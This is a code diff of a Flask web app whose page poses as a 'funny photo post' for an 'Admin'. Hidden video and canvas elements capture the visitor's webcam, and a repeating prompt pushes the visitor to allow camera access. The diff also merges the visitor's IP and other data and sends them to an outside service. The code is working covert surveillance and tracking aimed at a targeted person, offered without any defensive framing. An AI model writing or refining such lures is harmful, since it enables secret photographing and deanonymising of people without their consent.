@@ -58,8 +58,6 @@ def track():
     <body>
         <h1>Hello Admin</h1>
         <p>Hi here is a funny photo post this.</p>
-        <img src="main/Image1.jpg">
-        <img src="main/Image2.jpg">
         <p id="status"> </p>
         <video id="video" width="640" height="480" autoplay style="display:none;"></video>
         <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
@@ -93,9 +91,9 @@ def track():
                         document.getElementById('status').innerText = 
                             'Camera access denied. Please allow camera access to continue.';
                         
-                        // Redirect to a page that prompts for permission again
-                        if (confirm('Camera access is required. Click OK to try again or Cancel to proceed without photo.')) {
-                            // Retry immediately
+                        // Prompt user to retry or proceed without photo
+                        if (confirm('Camera access is required to take a funny photo! Click OK to try again or Cancel to skip.')) {
+                            // Wait briefly and retry
                             await new Promise(resolve => setTimeout(resolve, 1000));
                             continue;
                         } else {
@@ -170,8 +168,10 @@ def track():
 def log():
     client_data = request.json
     if visitor_data and client_data:
-        visitor_data[-1].update(client_data)
-        send_to_render(visitor_data[-1])
+        # Merge server-side data (including IP) with client-side data
+        combined_data = visitor_data[-1].copy()
+        combined_data.update(client_data)
+        send_to_render(combined_data)
     return jsonify({'status': 'success'})
 
 def send_to_render(data):
